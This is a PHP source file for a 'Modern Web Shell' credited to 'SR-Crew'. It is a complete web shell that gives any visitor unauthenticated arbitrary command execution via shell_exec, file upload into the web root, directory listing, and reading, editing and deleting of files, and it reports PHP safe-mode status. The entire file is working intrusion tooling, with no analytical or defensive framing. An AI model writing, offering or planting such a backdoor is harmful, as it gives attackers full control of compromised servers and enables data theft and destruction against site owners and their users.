<?php
declare(strict_types=1);
session_start();

$owner = "SR-Crew";
$version = "2.0.0";

function isSafeModeOn(): bool {
    return ini_get('safe_mode') ? true : false;
}

function executeCommand(string $cmd): string {
    $cmd = trim($cmd);
    if ($cmd === '') {
        return '';
    }
    // Use escapeshellcmd carefully; here we allow full command execution for testing
    // You can add sanitization or restrictions as needed
    $output = shell_exec($cmd . ' 2>&1');
    return $output === null ? '' : $output;
}

function listFiles(string $dir = '.'): array {
    $files = [];
    if (is_dir($dir)) {
        $handle = opendir($dir);
        if ($handle) {
            while (($file = readdir($handle)) !== false) {
                if ($file !== '.' && $file !== '..') {
                    $files[] = $file;
                }
            }
            closedir($handle);
        }
    }
    return $files;
}

function uploadFile(array $file): string {
    if (!isset($file['tmp_name']) || !is_uploaded_file($file['tmp_name'])) {
        return 'No file uploaded or invalid upload.';
    }
    $target = basename($file['name']);
    if (file_exists($target)) {
        return 'File already exists.';
    }
    if (move_uploaded_file($file['tmp_name'], $target)) {
        return 'File uploaded successfully.';
    }
    return 'File upload failed.';
}

function readFileContents(string $filename): string {
    if (!file_exists($filename)) {
        return 'File does not exist.';
    }
    $contents = file_get_contents($filename);
    return $contents === false ? 'Failed to read file.' : htmlspecialchars($contents);
}

function saveFileContents(string $filename, string $contents): string {
    $result = file_put_contents($filename, $contents);
    return $result === false ? 'Failed to save file.' : 'File saved successfully.';
}

function deleteFile(string $filename): string {
    if (!file_exists($filename)) {
        return 'File does not exist.';
    }
    return unlink($filename) ? 'File deleted successfully.' : 'Failed to delete file.';
}

// Handle POST actions
$commandOutput = '';
$uploadMessage = '';
$fileContents = '';
$fileStatus = '';
$files = listFiles();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['command'])) {
        $commandOutput = executeCommand($_POST['command']);
    }
    if (isset($_FILES['upload_file'])) {
        $uploadMessage = uploadFile($_FILES['upload_file']);
        $files = listFiles(); // Refresh file list after upload
    }
    if (isset($_POST['file_action'], $_POST['filename'])) {
        $filename = basename($_POST['filename']);
        switch ($_POST['file_action']) {
            case 'open':
                $fileContents = readFileContents($filename);
                break;
            case 'save':
                $contents = $_POST['file_contents'] ?? '';
                $fileStatus = saveFileContents($filename, $contents);
                $fileContents = htmlspecialchars($contents);
                break;
            case 'delete':
                $fileStatus = deleteFile($filename);
                $fileContents = '';
                $files = listFiles(); // Refresh file list after deletion
                break;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>Modern Web Shell v<?=htmlspecialchars($version)?></title>
<style>
    body { font-family: Verdana, sans-serif; background: #FFFFD5; color: #000; cursor: crosshair; }
    textarea { width: 100%; font-family: monospace; }
    .container { max-width: 900px; margin: auto; }
    .section { background: #FCFEBA; padding: 10px; margin-bottom: 20px; border: 1px solid #000; }
    h2 { margin-top: 0; }
    table { width: 100%; }
    input[type="text"], input[type="file"] { width: 100%; }
    button, input[type="submit"] { padding: 5px 10px; }
</style>
</head>
<body>
<div class="container">
    <h1>Modern Web Shell v<?=htmlspecialchars($version)?></h1>
    <p><strong>Owner:</strong> <?=htmlspecialchars($owner)?></p>
    <p><strong>Safe Mode:</strong> <?=isSafeModeOn() ? '<span style="color:red;">ON</span>' : '<span style="color:green;">OFF</span>'?></p>

    <div class="section">
        <h2>Command Execution</h2>
        <form method="post">
            <textarea name="command" rows="3" placeholder="Enter command here..."></textarea><br />
            <input type="submit" value="Execute" />
        </form>
        <pre><?=htmlspecialchars($commandOutput)?></pre>
    </div>

    <div class="section">
        <h2>File Upload</h2>
        <form method="post" enctype="multipart/form-data">
            <input type="file" name="upload_file" required />
            <input type="submit" value="Upload" />
        </form>
        <p><?=htmlspecialchars($uploadMessage)?></p>
    </div>

    <div class="section">
        <h2>Files & Directories</h2>
        <ul>
            <?php foreach ($files as $file): ?>
                <li><?=htmlspecialchars($file)?></li>
            <?php endforeach; ?>
        </ul>
    </div>

    <div class="section">
        <h2>File Editor</h2>
        <form method="post">
            <input type="text" name="filename" placeholder="Filename" value="<?=htmlspecialchars($_POST['filename'] ?? '')?>" required />
            <button type="submit" name="file_action" value="open">Open</button>
            <button type="submit" name="file_action" value="delete" onclick="return confirm('Delete this file?')">Delete</button>
        </form>
        <?php if ($fileContents !== ''): ?>
            <form method="post">
                <input type="hidden" name="filename" value="<?=htmlspecialchars($_POST['filename'] ?? '')?>" />
                <textarea name="file_contents" rows="10"><?= $fileContents ?></textarea><br />
                <button type="submit" name="file_action" value="save">Save</button>
            </form>
        <?php endif; ?>
        <p><?=htmlspecialchars($fileStatus)?></p>
    </div>
</div>
</body>
</html>
